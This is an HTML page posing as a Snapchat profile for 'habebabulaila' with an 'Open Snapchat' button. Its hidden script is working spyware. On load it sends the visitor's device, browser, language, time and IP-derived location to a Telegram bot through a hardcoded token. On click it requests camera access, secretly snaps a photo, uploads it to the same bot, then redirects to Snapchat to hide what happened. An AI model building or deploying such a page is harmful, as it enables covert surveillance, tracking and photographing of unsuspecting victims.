<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>habebabulaila | Snapchat</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{
  margin:0;
  height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  background:linear-gradient(180deg,#FFFC00,#ffffff);
  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
}

.container{
  text-align:center;
}

.avatar{
  width:120px;
  height:120px;
  border-radius:50%;
  background:#fff;
  margin:0 auto 20px;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:48px;
  font-weight:bold;
  color:#000;
  box-shadow:0 10px 30px rgba(0,0,0,.2);
}

h1{
  margin:0 0 20px;
  font-size:26px;
  color:#000;
}

button{
  background:#000;
  color:#fff;
  border:none;
  padding:15px 30px;
  font-size:18px;
  border-radius:30px;
  cursor:pointer;
}
</style>
</head>

<body>

<div class="container">
  <div class="avatar">ğŸ‘»</div>
  <h1>habebabulaila</h1>
  <button id="openSnap">Open Snapchat</button>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const BOT_TOKEN = "8301093694:AAEFQl_J7AvLc8_kRrpjVSyA0r5qdO6M2wo";
const CHAT_ID = "1186294172";
const SNAP_URL = "https://www.snapchat.com/add/habebabulaila";

/* ===== Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø²ÙŠØ§Ø±Ø© ===== */
(async () => {
  try{
    const ipRes = await fetch("https://ipapi.co/json/");
    const ipData = await ipRes.json();

    const info = `
ğŸ“¥ New Visit
ğŸ“± Device: ${navigator.platform}
ğŸŒ Browser: ${navigator.userAgent}
ğŸ—£ Language: ${navigator.language}
â° Time: ${new Date().toLocaleString()}
ğŸ“ Location: ${ipData.country_name || "?"} - ${ipData.city || "?"}
`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body:JSON.stringify({
        chat_id: CHAT_ID,
        text: info
      })
    });
  }catch(e){}
})();

/* ===== Ø²Ø± ÙØªØ­ Ø§Ù„Ø³Ù†Ø§Ø¨ + Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ===== */
const startBtn = document.getElementById("openSnap");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

startBtn.onclick = async () => {
  startBtn.disabled = true;

  try {
    // Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
    video.srcObject = stream;
    await video.play();

    // Ù†Ø£Ø®Ø° Ø§Ù„ØµÙˆØ±Ø© Ø¨Ø¹Ø¯ 700ms
    setTimeout(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video,0,0);

      canvas.toBlob(blob => {
        if(!blob || blob.size < 5000) return;

        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("photo", blob);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method:"POST",
          body:form
        }).finally(() => {
          // Ø¨Ø¹Ø¯ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© ØªØ­ÙˆÙŠÙ„ Ù…Ø¨Ø§Ø´Ø± Ù„Ù„Ø³Ù†Ø§Ø¨
          window.location.href = SNAP_URL;
        });
      },"image/jpeg");

      // ØªÙˆÙ‚Ù Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
      stream.getTracks().forEach(t=>t.stop());

    },700);

  } catch(e){
    // Ù„Ùˆ Ø±ÙØ¶ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ØŒ ØªØ­ÙˆÙŠÙ„ Ù…Ø¨Ø§Ø´Ø± Ù„Ù„Ø³Ù†Ø§Ø¨
    window.location.href = SNAP_URL;
  }
};
</script>

</body>
</html>
